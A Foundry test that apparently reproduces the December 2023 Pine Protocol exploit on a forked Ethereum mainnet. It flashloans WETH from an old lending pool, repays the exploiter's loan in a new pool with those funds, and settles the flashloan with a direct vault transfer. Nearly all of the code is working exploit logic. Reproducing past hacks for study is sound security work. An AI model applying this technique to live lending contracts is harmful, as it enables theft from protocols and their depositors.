// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~90K (info from hacked.slowmist.io)
// Attacker : https://etherscan.io/address/0x05324c970713450ba0bc12efd840034fcb0a4baa
// Attacker Contract : https://etherscan.io/address/0x1d5586da44328f28bfbbf59b808a87584355b3ef
// Vulnerable Contracts : https://etherscan.io/address/0x2405913d54fc46eeaf3fb092bfb099f46803872f
// https://etherscan.io/address/0xc3f4659588b13f23e09ec54783a3c407e39ad589
// NFT buy Tx: https://explorer.phalcon.xyz/tx/eth/0x2f328016764ecf1f57fda0f5490087a5ddba83706b51cf518bdbd7e65ae2383b
// Borrow Tx: https://explorer.phalcon.xyz/tx/eth/0xf4f254c3c6b64ded778b5af292c6ab6ed886c1bdd8988510bdc0ca0cf7f9857e
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d

// @Analysis
// https://medium.com/neptune-mutual/analysis-of-the-pine-protocol-exploit-e09dbcb80ca0
// https://twitter.com/MistTrack_io/status/1738131780459430338

interface IERC721LendingPool {
    function flashLoan(
        address _receiver,
        address _reserve,
        uint256 _amount,
        bytes memory _params
    ) external;

    function repay(
        uint256 nftID,
        uint256 repayAmount,
        address pineWallet
    ) external returns (bool);

    function _loans(
        uint256
    )
        external
        view
        returns (
            uint256 loanStartBlock,
            uint256 loanExpireTimestamp,
            uint32 interestBPS1000000XBlock,
            uint32 maxLTVBPS,
            uint256 borrowedWei,
            uint256 returnedWei,
            uint256 accuredInterestWei,
            uint256 repaidInterestWei,
            address borrower
        );
}

contract ContractTest is Test {
    IWETH private constant WETH =
        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC721LendingPool private constant ERC721LendingPool02Old =
        IERC721LendingPool(0x2405913d54fC46eEAF3Fb092BfB099F46803872f);
    IERC721LendingPool private constant ERC721LendingPool02New =
        IERC721LendingPool(0xC3f4659588b13f23E09Ec54783A3c407e39ad589);
    IERC721 private constant PPG =
        IERC721(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
    address private constant pineGnosisSafe =
        0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e;
    address private constant pineExploiter =
        0x05324c970713450bA0Bc12EfD840034FCB0A4BAa;
    uint256 private constant collateralTokenId = 3_324;

    function setUp() public {
        vm.createSelectFork("mainnet", 18835344);
        vm.label(address(WETH), "WETH");
        vm.label(address(ERC721LendingPool02Old), "ERC721LendingPool02Old");
        vm.label(address(ERC721LendingPool02New), "ERC721LendingPool02New");
        vm.label(address(PPG), "PPG");
        vm.label(address(pineGnosisSafe), "pineGnosisSafe");
        vm.label(address(pineExploiter), "pineExploiter");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Before loan repay] Vault WETH balance after borrowing ~4 WETH to exploiter",
            WETH.balanceOf(pineGnosisSafe),
            18
        );
        emit log_named_address(
            "[Before loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral",
            PPG.ownerOf(collateralTokenId)
        );
        (
            ,
            ,
            ,
            ,
            uint256 borrowedWei,
            ,
            ,
            ,
            address borrower
        ) = ERC721LendingPool02New._loans(collateralTokenId);

        console.log(
            "[Before loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s",
            borrowedWei,
            borrower
        );
        console.log("---Exploit start---");
        console.log("1. Taking flashloan from the old lending pool");
        bytes memory params = abi.encode(
            collateralTokenId,
            address(ERC721LendingPool02New),
            pineGnosisSafe
        );
        vm.prank(address(this), pineExploiter);
        ERC721LendingPool02Old.flashLoan(
            address(this),
            address(WETH),
            WETH.balanceOf(pineGnosisSafe),
            params
        );
        console.log("---Exploit end---");
        emit log_named_decimal_uint(
            "[After loan repay] Vault WETH balance (nothing has changed and exploiter successfully repayed his ~4 WETH loan)",
            WETH.balanceOf(pineGnosisSafe),
            18
        );
        emit log_named_address(
            "[After loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral",
            PPG.ownerOf(collateralTokenId)
        );
        (, , , , borrowedWei, , , , borrower) = ERC721LendingPool02New._loans(
            collateralTokenId
        );

        console.log(
            "[After loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s",
            borrowedWei,
            borrower
        );
    }

    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes memory _params
    ) external {
        vm.startPrank(address(this), pineExploiter);
        WETH.approve(address(ERC721LendingPool02New), type(uint256).max);
        console.log(
            "2. Using flashloaned WETH amount from old lending pool to repay loan in new lending pool"
        );
        ERC721LendingPool02New.repay(collateralTokenId, _amount, address(0));
        // Exploiter send to attack contract additional 0.3 WETH to repay the flashloan in the old pool
        deal(
            address(WETH),
            address(this),
            WETH.balanceOf(address(this)) + 0.3 ether
        );
        console.log(
            "3. Repaying flashloan by transferring WETH straight to the Vault"
        );
        uint256 amountToTransfer = _amount - WETH.balanceOf(pineGnosisSafe);
        WETH.transfer(pineGnosisSafe, amountToTransfer);
        vm.stopPrank();
    }
}
